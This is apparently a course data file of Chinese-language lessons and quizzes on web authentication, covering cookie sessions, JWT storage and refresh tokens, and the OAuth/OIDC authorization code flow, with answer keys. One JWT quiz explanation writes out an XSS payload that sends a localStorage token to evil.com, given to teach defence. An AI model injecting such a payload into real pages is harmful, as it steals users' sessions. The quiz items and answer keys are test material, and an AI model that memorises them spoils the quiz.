        explanation: 'HttpOnly + Secure + SameSite=Strict 是登入 Session Cookie 的最佳組合：HttpOnly 防 XSS 竊取、Secure 防網路監聽、SameSite=Strict 防 CSRF。SameSite=None 是給第三方 Cookie 用的，用在登入 Session 會讓跨站請求也能帶 Cookie，增加 CSRF 風險。用 JavaScript 的 document.cookie 設定 Cookie 意味著無法加 HttpOnly（JS 能設定 HttpOnly Cookie 是後端的工作）。',
      },
    ],
    keyPoints: [
      'Cookie-Session 架構：Session ID 存在 Cookie，實際 Session 資料存在伺服器（記憶體或 Redis）。',
      'HttpOnly 讓 JS 無法讀 Cookie（防 XSS）；Secure 只在 HTTPS 傳送（防監聽）；SameSite=Strict 防 CSRF。',
      '生產環境用 Redis 儲存 Session，解決多伺服器共享和伺服器重啟 Session 消失的問題。',
      '登出必須同時刪除伺服器 Session 和清除客戶端 Cookie，只做一邊都不完整。',
      '登入成功後應重新產生新的 Session ID（session.regenerate()），防止 Session Fixation 攻擊。',
    ],
  },

  {
    slug: 'jwt-auth',
    title: 'JWT 認證機制',
    description: '理解 JWT 的 Header.Payload.Signature 結構、無狀態驗證流程及安全注意事項',
    subCategory: '認證與授權',
    difficulty: 'medium',
    notes: {
      sections: [
        {
          heading: 'JWT 結構：Header.Payload.Signature',
          content: `JWT（JSON Web Token）由三個 Base64URL 編碼的部分組成，以 "." 分隔：

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header
.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNTE2MjM5MDIyfQ  ← Payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c    ← Signature

Header（解碼後）：
{
  "alg": "HS256",  // 簽名演算法（HMAC SHA256）
  "typ": "JWT"
}

Payload（解碼後）：
{
  "sub": "1234567890",   // Subject：通常是 user ID
  "name": "Alice",       // 自訂 claim
  "iat": 1516239022,     // Issued At：發行時間（Unix timestamp）
  "exp": 1516242622      // Expiration：過期時間
}

Signature 計算：
HMAC_SHA256(
  base64url(Header) + "." + base64url(Payload),
  secretKey
)
\`\`\`

**重要：Payload 只是 Base64URL 編碼，不是加密！任何人都可以解碼讀取內容。**`,
        },
        {
          heading: 'JWT 驗證流程（無狀態）',
          content: `\`\`\`
登入流程：
1. POST /login { username, password }
2. 伺服器驗證憑證
3. 伺服器用 secret key 簽發 JWT，回傳給客戶端
4. 客戶端儲存 JWT

後續請求：
1. 客戶端在 Authorization Header 帶 JWT：
   Authorization: Bearer eyJhbGci...

2. 伺服器用相同的 secret key 驗證 Signature：
   - Signature 正確 → JWT 未被篡改
   - 檢查 exp（過期時間）
   - 從 Payload 取出 user ID 等資訊

3. 無狀態優勢：伺服器不需查資料庫或 Session Store
   任何持有 secret key 的伺服器都可以驗證 JWT
\`\`\`

這讓 JWT 天然適合微服務和水平擴展的架構。`,
        },
        {
          heading: 'JWT 儲存位置：localStorage vs HttpOnly Cookie',
          content: `**儲存在 localStorage**：
- 優點：JavaScript 可以直接讀取，方便使用
- 缺點：XSS 攻擊可用 localStorage.getItem('token') 竊取 JWT
  → 只要頁面有 XSS 漏洞，JWT 就會被偷走

**儲存在 HttpOnly Cookie**：
- 優點：JavaScript 無法讀取，防止 XSS 竊取
- 缺點：需要防範 CSRF 攻擊（搭配 SameSite 或 CSRF Token）

\`\`\`js
// 推薦做法：Access Token 存 Memory，Refresh Token 存 HttpOnly Cookie
// Access Token（短效，15分鐘）存在記憶體變數中
let accessToken = null  // 頁面重整就消失（反而是優點）

// Refresh Token（長效，7天）存在 HttpOnly Cookie
// Set-Cookie: refreshToken=xxx; HttpOnly; Secure; SameSite=Strict
\`\`\``,
        },
        {
          heading: 'Access Token + Refresh Token 模式',
          content: `\`\`\`
Access Token（短效，通常 15 分鐘-1 小時）：
- 用於存取 API，帶在 Authorization Header
- 過期快，降低洩漏風險
- 無狀態驗證，不需查 DB

Refresh Token（長效，通常 7-30 天）：
- 用於換取新的 Access Token
- 存在 HttpOnly Cookie（安全）
- 可以被撤銷（存在 DB，登出時刪除）

流程：
1. 登入 → 取得 Access Token + Refresh Token
2. 用 Access Token 打 API
3. Access Token 過期（401 Unauthorized）
4. 自動用 Refresh Token 打 POST /auth/refresh
5. 取得新的 Access Token，重試原本的 API
6. 登出時，刪除 DB 中的 Refresh Token
\`\`\`

這個模式結合了 JWT 的無狀態優勢和 Session 的可撤銷性。`,
        },
        {
          heading: 'JWT 的缺點與常見錯誤',
          content: `**JWT 主要缺點**：

1. **無法即時撤銷（Revoke）**：
   JWT 在 exp 到期前永遠有效，即使用戶登出或帳號被停用
   → 解法：維護黑名單（Token Blacklist），但這讓無狀態變有狀態

2. **Payload 不加密**：
   Base64URL 只是編碼，任何人都可以解碼讀取 Payload 內容
   → 千萬不要把密碼、敏感資訊（如信用卡號）放在 Payload

3. **Token 較大**：
   JWT 通常比 Session ID 大 10-100 倍，每次請求都帶著

\`\`\`js
// 常見錯誤：在 Payload 放敏感資料
// ❌ 錯誤：密碼放進 Payload
jwt.sign({ userId: 1, password: 'plaintext' }, secret)

// ✅ 正確：只放非敏感的識別資訊
jwt.sign({ sub: userId, role: 'user', exp: ... }, secret)

// 解碼 Payload（不需要 secret）
const base64Payload = token.split('.')[1]
JSON.parse(atob(base64Payload))  // 任何人都能看到！
\`\`\``,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: 'JWT 的 Payload 部分用什麼方式編碼？它是加密的嗎？',
        options: [
          'AES 加密，需要 secret key 才能解密',
          'Base64URL 編碼，不是加密，任何人都可以解碼讀取',
          'RSA 加密，只有公鑰持有者能解密',
          'Gzip 壓縮，無法直接讀取',
        ],
        answer: 1,
        explanation: 'JWT 的 Payload 只是用 Base64URL 編碼，這不是加密。任何人拿到 JWT 都可以用 atob() 解碼 Payload 讀取內容，不需要 secret key。JWT 的安全性來自 Signature，Signature 確保 Payload 沒有被篡改，但無法隱藏內容。因此絕對不能在 Payload 存密碼、信用卡號等敏感資料。',
      },
      {
        id: 2,
        question: 'JWT 相比 Cookie-Session 架構，最主要的優勢是什麼？',
        options: [
          'JWT 更安全，不會被 XSS 攻擊',
          '無狀態（Stateless）：伺服器不需要查詢 Session Store，天然支援水平擴展',
          'JWT 可以儲存更多的使用者資料',
          'JWT 的 Token 比 Session ID 更小，網路傳輸更快',
        ],
        answer: 1,
        explanation: 'JWT 最大優勢是無狀態驗證。伺服器只需要用 secret key 驗證 Signature 的正確性，就能確認 JWT 有效並從 Payload 取得用戶資訊，不需要查詢資料庫或 Redis。這讓多台伺服器都能獨立驗證請求，天然支援水平擴展和微服務架構。Session 架構需要所有伺服器共享同一個 Session Store（Redis）。JWT 的 Token 比 Session ID 大很多，安全性也各有優缺點。',
      },
      {
        id: 3,
        question: '以下哪個是 JWT Payload 中標準的過期時間 Claim 名稱？',
        options: [
          'expires',
          'expiry',
          'exp',
          'ttl',
        ],
        answer: 2,
        explanation: 'JWT 標準定義了幾個「Registered Claims」：sub（Subject，通常是 user ID）、iat（Issued At，發行時間）、exp（Expiration Time，過期時間）、iss（Issuer，發行者）、aud（Audience，接受者）等。exp 是 Unix timestamp 格式。伺服器在驗證 JWT 時，會檢查當前時間是否超過 exp，超過則拒絕請求。',
      },
      {
        id: 4,
        question: '將 JWT（Access Token）儲存在 localStorage 有什麼主要安全風險？',
        options: [
          'localStorage 的資料會自動過期，導致用戶頻繁重新登入',
          'XSS 攻擊可以用 JavaScript 讀取 localStorage，竊取 JWT',
          'localStorage 不支援 HTTPS，只能在 HTTP 使用',
          'localStorage 只能儲存字串，JWT 的格式不相容',
        ],
        answer: 1,
        explanation: '如果頁面有 XSS 漏洞（例如接受用戶輸入的地方沒有適當轉義），攻擊者可以注入 <script>fetch("https://evil.com?t="+localStorage.getItem("token"))</script>，輕易竊取 JWT。localStorage 完全暴露在 JavaScript 環境中。相較之下，存在 HttpOnly Cookie 的 JWT 無法被 JS 讀取，即使 XSS 也無法直接竊取。但 HttpOnly Cookie 需要防 CSRF。',
      },
      {
        id: 5,
        question: 'Access Token + Refresh Token 模式中，Refresh Token 通常如何儲存及其用途？',
        options: [
          'Refresh Token 存在 localStorage，用於每次 API 請求的身份驗證',
          'Refresh Token 存在 HttpOnly Cookie，用於在 Access Token 過期時換取新的 Access Token',
          'Refresh Token 存在 URL Query String，方便客戶端存取',
          'Refresh Token 不需要儲存，每次登入時重新申請',
        ],
        answer: 1,
        explanation: 'Refresh Token 設計為長效（7-30天），儲存在 HttpOnly Cookie（防 XSS 竊取，搭配 SameSite 防 CSRF）。它的唯一用途是：當短效的 Access Token（15分鐘-1小時）過期後，自動向 /auth/refresh 端點換取新的 Access Token，實現無感刷新。Refresh Token 通常存在資料庫，登出時可以刪除（實現可撤銷性），彌補了純 JWT 無法撤銷的缺點。',
      },
      {
        id: 6,
        question: 'JWT 最主要的缺點是什麼？',
        options: [
          'JWT 無法在 HTTPS 環境中使用',
          'JWT 在過期前無法即時撤銷，即使登出或帳號停用，Token 仍然有效',
          'JWT 只能用 HS256 演算法簽名',
          'JWT 不支援自訂 Claim（Payload 只能有標準欄位）',
        ],
        answer: 1,
        explanation: 'JWT 最大的缺點是無法即時撤銷。一旦 JWT 發行，在 exp 過期前永遠有效。即使用戶登出、密碼被改、帳號被停用，舊的 JWT 在過期前仍然可以使用。解決方案是維護 Token 黑名單（將登出的 Token 存入 Redis），但這讓 JWT 從無狀態變成有狀態，損失了一部分無狀態的優勢。這也是為什麼 Access Token 設計成短效（15分鐘），降低洩漏後的傷害期。',
      },
      {
        id: 7,
        question: 'JWT 的 Signature 是如何計算的（以 HS256 為例）？',
        options: [
          'MD5(Header + Payload)',
          'AES_256(Payload, secretKey)',
          'HMAC_SHA256(base64url(Header) + "." + base64url(Payload), secretKey)',
          'RSA_Sign(Payload, privateKey)',
        ],
        answer: 2,
        explanation: 'HS256（HMAC SHA256）的 Signature 計算：將 Base64URL 編碼的 Header 和 Payload 用 "." 連接，然後用 secretKey 做 HMAC SHA256 雜湊。伺服器收到 JWT 後，用相同的 secretKey 和演算法重新計算 Signature，比對是否一致——如果一致，代表 Payload 沒有被篡改。RS256（RSA SHA256）則用私鑰簽名、公鑰驗證，適合多服務共用的場景（不需要共享 secret）。',
      },
    ],
    keyPoints: [
      'JWT 由 Header.Payload.Signature 三部分組成，Payload 只是 Base64URL 編碼，任何人可解碼，不能放敏感資料。',
      'JWT 無狀態優勢：伺服器只需 secret key 驗簽，不需查 Session Store，天然支援水平擴展。',
      '儲存位置選擇：localStorage 方便但有 XSS 風險；HttpOnly Cookie 防 XSS 但需防 CSRF。',
      'Access Token（短效）+ Refresh Token（長效存 HttpOnly Cookie）是常見的最佳實踐。',
      'JWT 最大缺點：在 exp 過期前無法撤銷，即使登出也無法讓 Token 即時失效。',
      'Payload 的標準 Claims：sub（用戶ID）、iat（發行時間）、exp（過期時間）。',
    ],
  },

  {
    slug: 'oauth-flow',
    title: 'OAuth 第三方登入流程',
    description: '了解 OAuth 2.0 授權碼流程與 OpenID Connect，實作 Google/GitHub 第三方登入',
    subCategory: '認證與授權',
    difficulty: 'hard',
    notes: {
      sections: [
        {
          heading: 'OAuth 2.0 的四個角色',
          content: `| 角色 | 說明 | 實例 |
|------|------|------|
| **Resource Owner** | 資源擁有者（使用者） | 你本人，擁有 Google 帳號 |
| **Client** | 要存取資源的應用程式 | 你開發的網站/APP |
| **Authorization Server** | 負責驗證身份並發放 Token | Google 的 OAuth 伺服器 |
| **Resource Server** | 存放受保護資源的伺服器 | Google API（Gmail、Calendar） |

**OAuth 解決的核心問題**：
讓第三方應用程式（Client）在不需要知道使用者密碼的情況下，以受限的權限存取使用者的資源。例如：允許某個 TODO App 存取你的 Google Calendar，但不給它你的 Google 密碼。`,
        },
        {
          heading: 'Authorization Code Flow（授權碼流程）',
          content: `這是最安全、最常用的 OAuth 2.0 流程：

\`\`\`
步驟 1：用戶點擊「用 Google 登入」
  Client 將用戶重新導向到 Google 授權頁面：
  https://accounts.google.com/o/oauth2/auth
    ?client_id=YOUR_CLIENT_ID
    &redirect_uri=https://yourapp.com/callback
    &response_type=code
    &scope=openid email profile
    &state=RANDOM_STRING_CSRF

步驟 2：用戶在 Google 同意授權
  Google 重新導向回 Client：
  https://yourapp.com/callback
    ?code=AUTH_CODE_HERE
    &state=RANDOM_STRING_CSRF

步驟 3：Client（後端）用 Auth Code 換 Tokens
  POST https://oauth2.googleapis.com/token
  Body: {
    code: AUTH_CODE_HERE,
    client_id: YOUR_CLIENT_ID,
    client_secret: YOUR_CLIENT_SECRET,  ← 只在後端，不暴露給前端
    redirect_uri: https://yourapp.com/callback,
    grant_type: authorization_code
  }

步驟 4：Google 回傳 Tokens
  {
    access_token: "...",   ← 用於存取 Google API
    id_token: "...",       ← JWT，包含用戶資訊（OIDC）
    refresh_token: "...",
    expires_in: 3600
  }

步驟 5：Client 用 access_token 存取 Google API
  GET https://www.googleapis.com/oauth2/v3/userinfo
  Authorization: Bearer ACCESS_TOKEN
\`\`\``,
        },
        {
          heading: 'state 參數防 CSRF 攻擊',
          content: `\`\`\`js
// 步驟 1：產生隨機 state，儲存在 session
const state = crypto.randomBytes(32).toString('hex')
req.session.oauthState = state

// 重新導向到 Google，帶上 state
const authUrl = \`https://accounts.google.com/o/oauth2/auth?...\`
  + \`&state=\${state}\`

// 步驟 2（Callback 頁面）：驗證 state
router.get('/callback', (req, res) => {
  const { code, state } = req.query

  // 比對 state 是否和 session 中儲存的一致
  if (state !== req.session.oauthState) {
    return res.status(403).send('CSRF 攻擊偵測')
  }

  // state 驗證通過，繼續換取 Tokens
  // ...
})
\`\`\`

state 的作用：防止攻擊者偽造授權回調（CSRF），確保整個 OAuth 流程是由同一個用戶發起的。`,
        },
        {
          heading: 'OAuth vs OpenID Connect（OIDC）',
          content: `**OAuth 2.0**：
- 設計目的：**授權（Authorization）**
- 問題：「允許第三方應用程式存取我的資源嗎？」
- 回傳 Access Token：用於存取受保護的 API
- 無法告訴你「使用者是誰」

**OpenID Connect（OIDC）**：
- 建立在 OAuth 2.0 之上的**認證（Authentication）**標準
- 問題：「這個使用者是誰？」
- 在 OAuth 流程基礎上，額外回傳 **ID Token**（一個 JWT）
- ID Token 的 Payload 包含用戶資訊（sub、email、name、picture）

\`\`\`
OAuth 2.0：我允許你存取我的 Google Drive
OIDC：我用 Google 帳號登入（告訴你我是誰）

scope=openid          → 觸發 OIDC，取得 id_token
scope=openid email    → id_token 中包含 email
scope=openid profile  → id_token 中包含 name, picture
\`\`\`

| 特性 | OAuth 2.0 | OIDC |
|------|-----------|------|
| 目的 | 授權（Authorization） | 認證（Authentication） |
| 回傳 | Access Token | Access Token + ID Token |
| 用途 | 存取 API | 確認用戶身份 |`,
        },
        {
          heading: '前端框架整合：next-auth',
          content: `\`\`\`ts
// app/api/auth/[...nextauth]/route.ts（Next.js App Router）
import NextAuth from 'next-auth'
import Google from 'next-auth/providers/google'
import GitHub from 'next-auth/providers/github'

const handler = NextAuth({
  providers: [
    Google({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
    }),
    GitHub({
      clientId: process.env.GITHUB_ID!,
      clientSecret: process.env.GITHUB_SECRET!,
    }),
  ],
  callbacks: {
    async jwt({ token, account, profile }) {
      // 第一次登入時，account 和 profile 有值
      if (account) {
        token.accessToken = account.access_token
        token.id = profile?.sub  // Google 的用戶 ID
      }
      return token
    },
    async session({ session, token }) {
      session.accessToken = token.accessToken as string
      return session
    },
  },
})

export { handler as GET, handler as POST }
\`\`\`

\`\`\`tsx
// 客戶端登入按鈕
import { signIn, signOut, useSession } from 'next-auth/react'

function LoginButton() {
  const { data: session } = useSession()
  if (session) {
    return <button onClick={() => signOut()}>登出 {session.user?.name}</button>
  }
  return <button onClick={() => signIn('google')}>用 Google 登入</button>
}
\`\`\``,
        },
      ],
    },
    questions: [
      {
        id: 1,
        question: 'OAuth 2.0 中，「Authorization Server」的職責是什麼？',
        options: [
          '存放使用者的照片、文件等受保護資源',
          '開發第三方應用程式的伺服器',
          '驗證使用者身份並發放 Access Token',
          '負責儲存使用者的 Session',
        ],
        answer: 2,
        explanation: 'Authorization Server（授權伺服器）是 OAuth 2.0 的核心，負責兩件事：1) 驗證 Resource Owner（使用者）的身份（讓用戶在 Google 頁面輸入帳密）；2) 在用戶同意後，向 Client（第三方應用）發放 Access Token。例如 Google 的 accounts.google.com 就是 Authorization Server。Resource Server 才是存放資源的地方（如 googleapis.com）。',
      },
      {
        id: 2,
        question: '在 OAuth 2.0 授權碼流程中，為什麼使用 Authorization Code 中間步驟，而不是直接回傳 Access Token？',
        options: [
          '因為 Access Token 太長，無法放在 URL 中',
          'Authorization Code 可以重複使用，增加彈性',
          '避免 Access Token 暴露在瀏覽器 URL 或歷史記錄中，Code 換 Token 在後端進行，需要 client_secret',
          'Google 規定必須用兩個步驟，沒有技術原因',
        ],
        answer: 2,
        explanation: '授權碼流程的安全設計：如果直接在重新導向 URL 中回傳 Access Token（Implicit Flow），Token 會出現在瀏覽器 URL 列和歷史記錄中，有洩漏風險。Authorization Code 只是一個短效的一次性代碼，真正的 Token 交換在後端進行，需要帶上 client_secret（只有後端知道），確保只有合法的應用程式能換到 Token。這個步驟也稱為「後端通道（Back Channel）」。',
      },
      {
        id: 3,
        question: 'OAuth 2.0 流程中，state 參數的主要用途是什麼？',
        options: [
          '儲存使用者的偏好設定（state = 狀態）',
          '加密 Authorization Code',
          '防止 CSRF 攻擊，確認回調請求是由同一個用戶發起的',
          '指定要請求的權限範圍（scope）',
        ],
        answer: 2,
        explanation: 'state 是一個由 Client 產生的隨機字串，儲存在用戶的 session 中，同時附在授權請求 URL 上。授權完成後，Google 在重新導向 URL 中帶回相同的 state。Client 比對收到的 state 和 session 中的 state 是否一致——如果不一致，代表這個回調請求可能是攻擊者偽造的 CSRF 攻擊。這確保了整個 OAuth 流程的完整性。',
      },
      {
        id: 4,
        question: 'OAuth 2.0 和 OpenID Connect（OIDC）的核心差異是什麼？',
        options: [
          'OAuth 是 Google 的標準，OIDC 是 Facebook 的標準',
          'OAuth 用於授權（允許存取資源），OIDC 建立在 OAuth 之上，用於認證（確認用戶身份），額外回傳 ID Token',
          'OAuth 回傳 JWT，OIDC 回傳 Session ID',
          'OAuth 2.0 是舊版，OIDC 是它的新版本替代品',
        ],
        answer: 1,
        explanation: 'OAuth 2.0 設計目標是「授權」：讓第三方應用取得存取特定資源的許可，回傳 Access Token。但 Access Token 本身不告訴你「用戶是誰」。OIDC（OpenID Connect）在 OAuth 2.0 基礎上新增了「認證」層：在 scope 加上 openid，流程中會額外回傳 ID Token（JWT 格式），其 Payload 包含用戶資訊（sub、email、name 等）。因此「用 Google 登入」實際上是使用 OIDC，而「允許某 App 存取你的 Google Drive」是純 OAuth。',
      },
      {
        id: 5,
        question: '在 OIDC 流程中，要取得使用者的 email 地址，scope 參數應該設定什麼？',
        options: [
          'scope=email_only',
          'scope=access email',
          'scope=openid email',
          'scope=user:email',
        ],
        answer: 2,
        explanation: 'OIDC 的 scope 必須包含 openid 才能啟動 OIDC 流程（否則只是純 OAuth）。在此基礎上加 email 才能在 ID Token 和 userinfo endpoint 中取得用戶 email。常用的 scope 組合：openid（基本 OIDC，取得 sub）、openid email（加上 email）、openid profile（加上 name、picture 等個人資料）。注意 GitHub OAuth 的 scope 格式稍有不同（user:email）。',
      },
      {
        id: 6,
        question: '在 OAuth 授權碼流程中，client_secret 應該放在哪裡？',
        options: [
          '放在前端的 JavaScript 程式碼中，方便客戶端直接換取 Token',
          '放在 URL 的 Query String 中傳送',
          '只放在後端伺服器，不暴露給客戶端，用於後端向 Authorization Server 換取 Token',
          '存在用戶的 localStorage 中',
        ],
        answer: 2,
        explanation: 'client_secret 是應用程式向 Authorization Server（如 Google）的身份憑證，必須嚴格保密。它只應存在後端環境（如環境變數 process.env.CLIENT_SECRET），用於後端在「Code 換 Token」的步驟中驗證身份。如果 client_secret 暴露在前端 JS、URL 或原始碼中，攻擊者可以冒充你的應用程式發出請求。前端（如行動 APP、SPA）無法安全保存 client_secret，這些情況應使用 PKCE（Proof Key for Code Exchange）流程。',
      },
      {
        id: 7,
        question: '以下哪個說法描述了 Access Token 和 ID Token 的正確用途？',
        options: [
          'Access Token 用於確認使用者身份，ID Token 用於存取 Google API',
          'Access Token 用於存取受保護的 API（Resource Server），ID Token 是 JWT 用於確認使用者身份和取得用戶資訊',
          'Access Token 和 ID Token 完全相同，只是不同的名稱',
          'Access Token 存在 Cookie，ID Token 存在 localStorage',
        ],
        answer: 1,
        explanation: 'Access Token 是「門票」，用於向 Resource Server（如 Google API）證明你有權存取資源，帶在 Authorization: Bearer 中。它通常不包含詳細的用戶資訊，Resource Server 自行驗證有效性。ID Token 是 OIDC 特有的，是一個 JWT，Payload 包含用戶的識別資訊（sub、email、name、picture 等），用途是讓 Client 知道「用戶是誰」，通常不用於存取 API。',
      },
    ],
    keyPoints: [
      'OAuth 2.0 四個角色：Resource Owner（用戶）、Client（你的 App）、Authorization Server（Google）、Resource Server（Google API）。',
      '授權碼流程：重新導向取得 Code → 後端用 Code + client_secret 換 Token，Code 中間步驟避免 Token 暴露在 URL。',
      'state 參數是隨機字串，儲存在 session，回調時比對是否一致，防止 CSRF 偽造攻擊。',
      'OAuth 是「授權」（能否存取資源）；OIDC 建立在 OAuth 上，加上「認證」（用戶是誰），額外回傳 ID Token（JWT）。',
      'client_secret 只能存在後端環境變數，絕不能暴露在前端或原始碼。',
      'Next.js 可用 next-auth 套件快速整合 Google/GitHub 等第三方登入，自動處理整個 OAuth/OIDC 流程。',
    ],
  },
]
